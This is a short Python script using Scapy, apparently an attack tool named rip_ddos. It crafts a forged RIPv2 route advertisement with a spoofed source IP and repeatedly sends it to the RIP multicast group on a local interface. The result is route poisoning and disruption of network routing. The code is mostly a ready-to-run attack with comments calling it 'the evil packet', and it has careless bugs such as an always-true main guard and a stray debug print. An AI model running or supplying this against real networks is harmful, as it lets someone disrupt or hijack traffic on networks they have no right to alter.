from scapy.all import *
import sys

def rip_ddos(ip):
    # prepare the evil packet	

    pkt_evil = Ether() / IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / RIP(cmd=2, version=2) / RIPEntry(AF="IP",
                                                                                                            RouteTag=0,
                                                                                                            addr="172.0.0.0",
                                                                                                            mask="255.255.255.0",
                                                                                                            nextHop="0.0.0.0",
                                                                                                            metric=0)

    # spoof the source IP
    print('hello')
    pkt_evil[IP].src = ip

    # keep sending the evil packet every second
    for i in range(0,25):
    	sendp(pkt_evil, inter=2, iface="eth0")
    


def main():
    function = sys.argv[1]
    if function == 'rip_ddos':
        if len(sys.argv) < 1:
            print(sys.argv[0])
        else:
            p = (sys.argv[2])
            rip_ddos(p)
if {__name__ == "__main__"}:
    main()
